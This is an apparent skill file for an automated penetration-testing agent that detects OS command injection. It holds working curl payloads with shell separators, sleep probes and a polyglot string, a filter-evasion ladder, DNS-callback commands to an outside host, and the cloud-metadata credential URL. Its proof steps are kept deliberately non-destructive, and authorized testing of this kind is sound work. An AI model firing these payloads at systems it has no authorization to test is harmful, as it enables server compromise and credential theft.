---
name: command_injection
agent: agent5_injection
description: OS command injection — context mapping, blind/time-based detection, and out-of-band DNS-callback confirmation without destructive commands.
---

# Command Injection

## Purpose

Detects OS command injection where user input reaches a shell: ping utilities, PDF/export generators, image converters, webhook testers, "diagnostic" tools, filename handling in uploads. Most testers try `;id` once and quit. This skill maps the context (direct shell vs argument injection vs blind), detects via time and out-of-band channels, and confirms with a DNS callback — never with destructive commands. Real impact: full server compromise, cloud metadata theft (IMDS), lateral movement.

## Division of labor

- **Consumes:** endpoint/parameter inventory from `agent2_mapping`, any `$where`/template-eval notes from sibling skills (`nosql_injection`, `ssti_probe`) suggesting code-execution context.
- **Produces:** `findings/command_injection.md` — per-parameter verdict table with context type and confirmation evidence. Finished artifact; `agent9_chaining` consumes CONFIRMED rows.

## When to use / when NOT to use

- **Use when:** features that plausibly shell out — ping/traceroute/dns-lookup tools, URL fetchers, file converters, report generators, notification/webhook test endpoints, any parameter named `cmd`, `command`, `host`, `ip`, `url`, `file`, `path`, `template`, `query`.
- **Skip when (time-pass filter):** the input is reflected but the feature is client-side only (check the JS — if no request carries the value, stop); the endpoint requires privileges you don't have; a single `;id` attempt returned the baseline — one attempt is not a test, but blindly fuzzing 200 separators on a static page is time-pass.

## Methodology

1. **Inventory shell-adjacent features.** List every feature that could spawn a process. Read the frontend JS for `fetch(`/api/ping?host=`, `exec(`, `spawn(`, `child_process` strings — the JS often names the backend route.
2. **Baseline the feature.** Normal input → record status, body, timing (3 samples, note jitter). Error input (`host=!!!`) → record. You need both before injecting.
3. **Direct-output probes.** Try separators one family at a time: `;id`, `|id`, `||id`, `&&id`, `` `id` ``, `$(id)`, `%0aid`. Look for `uid=`, `gid=` in the response. If output appears: CONFIRMED with 2x reproduction — skip to step 9.
4. **Argument-injection context.** If separators are stripped but the value becomes a flag, try `-h`, `--help`, and on ImageMagick-style tools try `|convert`. Reflected help text or usage output = argument injection CONFIRMED.
5. **Blind detection via timing.** `;sleep 5`, `|sleep 5`, `$(sleep 5)`, plus URL-encoded and double-encoded variants. Measure with `%{time_total}` against the 3-sample baseline. Require delay ≥ baseline+4s, reproduced 2x, with a `sleep 0` control that stays at baseline.
6. **Out-of-band DNS confirmation.** This is the gold standard for blind contexts. Use a canary domain you control or an interactsh-style collaborator: `;nslookup <RANDOM>.oob.<YOUR_DOMAIN>`, `|ping -c1 <RANDOM>.oob.<YOUR_DOMAIN>`, `$(getent hosts <RANDOM>.oob.<YOUR_DOMAIN>)`. A DNS hit for the unique random subdomain = CONFIRMED command execution, even with zero output and zero timing delta.
7. **Windows contexts.** If headers/stack suggest Windows (IIS, ASP.NET, `Server: Microsoft-`): use `&whoami`, `|whoami`, `&ping -n 5 127.0.0.1`, and PowerShell-flavored `;Start-Sleep -s 5`. Look for `whoami` output patterns or the 5-second delay.
8. **WAF/filter evasion ladder.** If direct probes return baseline: try `${IFS}id`, `$'\x69\x64'`-style obfuscation only where legal on the target, newline `%0a`, tab `%09`, and semicolon alternatives. Log each; unchanged baseline after the ladder = NEGATIVE for that parameter.
9. **Benign proof only.** On CONFIRMED: run `id` / `whoami` / `hostname` once for the report. Do NOT read `/etc/passwd`, do NOT touch IMDS (`169.254.169.254`) from here — cloud-metadata theft is a chaining decision for `agent9_chaining` with human approval.
10. **Second-order and async.** If the feature queues work (report generation, "we'll email you"), check the delivered artifact or status endpoint for injected output — the injection may execute minutes later.
11. **Verdict per parameter.** CONFIRMED requires direct output 2x, or timing 2x + control, or one DNS-callback hit (unique subdomain, logged at the collaborator). Anything less is INCONCLUSIVE.

## Exact commands

Baseline timing (3 samples):
```bash
for i in 1 2 3; do curl -s -o /dev/null -w "base $i: %{time_total}s\n" --get '<TARGET>/api/ping' --data-urlencode 'host=8.8.8.8'; done
```

Direct-output separator sweep:
```bash
for sep in ';' '|' '||' '&&' '%0a' '%09'; do
  echo "=== sep: $sep ==="
  curl -s --get '<TARGET>/api/ping' --data-urlencode "host=8.8.8.8${sep}id" | grep -a -o -m1 'uid=[0-9]*([^)]*)' || echo 'no uid'
done
```

Backtick / command-substitution:
```bash
curl -s --get '<TARGET>/api/ping' --data-urlencode 'host=`id`' | grep -a -o -m1 'uid=[0-9]*' || echo 'no'
curl -s --get '<TARGET>/api/ping' --data-urlencode 'host=$(id)' | grep -a -o -m1 'uid=[0-9]*' || echo 'no'
```

Blind timing with control:
```bash
curl -s -o /dev/null -w 'sleep5: %{time_total}s\n' --get '<TARGET>/api/ping' --data-urlencode 'host=8.8.8.8;sleep 5'
curl -s -o /dev/null -w 'sleep0: %{time_total}s\n' --get '<TARGET>/api/ping' --data-urlencode 'host=8.8.8.8;sleep 0'
```

DNS-callback confirmation (unique subdomain per attempt):
```bash
R="cmdi$(date +%s%N | md5sum | cut -c1-8)"
curl -s -o /dev/null --get '<TARGET>/api/ping' --data-urlencode "host=8.8.8.8;nslookup ${R}.oob.<YOUR_DOMAIN>"
echo "now check collaborator/DNS logs for: ${R}.oob.<YOUR_DOMAIN>"
```

Windows flavor:
```bash
curl -s --get '<TARGET>/api/ping' --data-urlencode 'host=8.8.8.8&whoami' | head -c 300; echo
curl -s -o /dev/null -w 'win-sleep: %{time_total}s\n' --get '<TARGET>/api/ping' --data-urlencode 'host=8.8.8.8&ping -n 5 127.0.0.1'
```

## Separator / context matrix

Test each row — the context determines which separators even reach a shell:

| Context | Probes | What success looks like |
|---|---|---|
| Direct shell (`system("ping $input")`) | `;id` `\|id` `&&id` `\|\|id` `` `id` `` `$(id)` `%0aid` | `uid=` in response |
| Shell, quotes (`system("ping '$input'")`) | `';id;'` `'&&id'` `'\|id'` | `uid=` in response |
| Argument position (`exec("ping", [$input])` — no shell) | `-h` `--help` `\|id` (ImageMagick) | usage text / help output reflected |
| PowerShell (`powershell -c "Test-Connection $input"`) | `;whoami` `\|whoami` `$(whoami)` | `whoami` output or domain\user |
| Blind, no output | `;sleep 5` + `sleep 0` control; DNS callback | timing delta 2x / collaborator hit |
| Filtered semicolon | `%0a` `%0d%0a` `%09` `${IFS}` newline-in-JSON `\u000a` | any probe from the rows above firing |

**Polyglot first-strike (one request, many contexts):**
```
$(sleep 5)`sleep 5`;sleep 5|sleep 5%0asleep 5
```
If ANY context executes, you get the delay — then narrow down to the exact separator with single probes for the report.

**Evasion ladder (run in order, log each):**
1. `${IFS}id` instead of `id` (space-filter bypass)
2. `a=id;b=$a;$b` (variable indirection — only where assignment survives)
3. Double URL-encode the separator: `%253Bid`
4. Unicode/overlong: `%c0%af` style where the stack normalizes
5. Time-based via `ping -c 5 127.0.0.1` when `sleep` is blocklisted (5 packets ≈ 4s delay)

**Cloud-metadata note (chaining only, human-approved):**
If command execution is CONFIRMED, the IMDS endpoints (`http://169.254.169.254/latest/meta-data/iam/security-credentials/`) are reachable from the server's network position — but fetching them is an `agent9_chaining` decision with human approval, never this skill's proof step.

## Completion-bias defenses

- [ ] Shell-adjacent features inventoried from JS + endpoint list, not just guessed
- [ ] Baseline timing taken 3x before any injection
- [ ] All separator families tried (not just `;id` once)
- [ ] Argument-injection context tested separately from shell context
- [ ] Every timing claim has a sleep-0 control and 2x reproduction
- [ ] DNS-callback attempted for every blind-suspect parameter (unique subdomain each time)
- [ ] Windows payload family tried when stack suggests it
- [ ] Filter-evasion ladder run before any NEGATIVE verdict
- [ ] Proof limited to id/whoami/hostname — no file reads, no IMDS
- [ ] Async/second-order delivery checked where the feature queues work
- [ ] `findings/command_injection.md` exists with verdict table and raw pairs
- **Review step:** agent10_review must verify (a) direct-output hits show `uid=`/`whoami` in the saved response, (b) timing hits have control timings attached, (c) DNS hits show the collaborator log entry for the exact unique subdomain, (d) no destructive or IMDS command was executed.
- **Nudge prompts:**
  - "Keep going until every separator family and both OS flavors are tested on each suspect parameter — one `;id` is not a test."
  - "Blind without a DNS callback is a guess. Get the collaborator hit before you claim CONFIRMED."
  - "Do not report done before findings/command_injection.md exists on disk."
- **Finished artifact definition:** `findings/command_injection.md` — per-parameter table (feature, parameter, context, verdict, proof) + raw pairs + collaborator log excerpts for OOB hits.

## Evidence standard

- Baseline: 3-sample timing baseline and error-input baseline saved first.
- Reproduction: direct output 2x; timing 2x + control; OOB = 1 hit on a unique subdomain (the uniqueness is the reproduction).
- Raw evidence: full request and response; collaborator/DNS log line for OOB.
- Verdicts: CONFIRMED (meets one of the three bars) / INCONCLUSIVE (timing once, no control — needs second run) / NEGATIVE (full ladder, baseline everywhere).

## Handoffs

- `agent9_chaining`: consumes CONFIRMED rows — IMDS/cloud-metadata theft, reverse-shell feasibility, and lateral movement are chaining decisions with human approval.
- `xxe_upload`: OOB collaborator infrastructure is shared — coordinate subdomain namespaces.
- `agent10_review`: consumes `findings/command_injection.md` — verifies proof boundaries before shipping.
